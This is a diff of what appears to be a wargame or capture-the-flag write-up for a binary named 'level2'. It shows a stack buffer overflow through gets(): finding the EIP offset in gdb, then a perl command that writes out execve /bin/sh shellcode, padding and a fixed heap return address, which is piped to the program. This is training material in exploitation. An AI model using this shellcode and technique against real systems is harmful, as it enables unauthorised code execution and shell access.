@@ -1,19 +1,21 @@
-# First we can see there is some sort of protection after gets() call
-# to prevent us from overflowing with an address like 0xB00000000.
-# But as ASLR is disabled, strdup is returning the same address at each execution.
-# So we can overwrite eip with the address returned by strdup to execute a shellcode we put on the heap
+First we can see there is some sort of protection after gets() call
+to prevent us from overflowing with an address like 0xB00000000.
+But as ASLR is disabled, strdup is returning the same address at each execution.
+So we can overwrite eip with the address returned by strdup to execute a shellcode we put on the heap
 
-# Using 'projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/'
-# I generate a string to find offset
+Using 'projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/'
+I generate a string to find eip offset
 
 (gdb) shell perl -e 'print "Aa0Aa1Aa[...]Ad2A"' > /tmp/eip_finder
 (gdb) run < /tmp/eip_finder
 Program received signal SIGSEGV, Segmentation fault.
 0x37634136 in ?? ()
 
-# offset is 80, we need to fill the 80 bytes and then put our address in little endian format
+offset is 80, we need to fill the 80 bytes and then put our address in little endian format
 
-perl -e 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "A"x35 . "\x08\xa0\x04\x08"' > /tmp/shellcode
+perl -e 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\
+\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\
+\xff/bin/sh" . "A"x35 . "\x08\xa0\x04\x08"' > /tmp/shellcode
 cat /tmp/shellcode - | ./level2
 
 
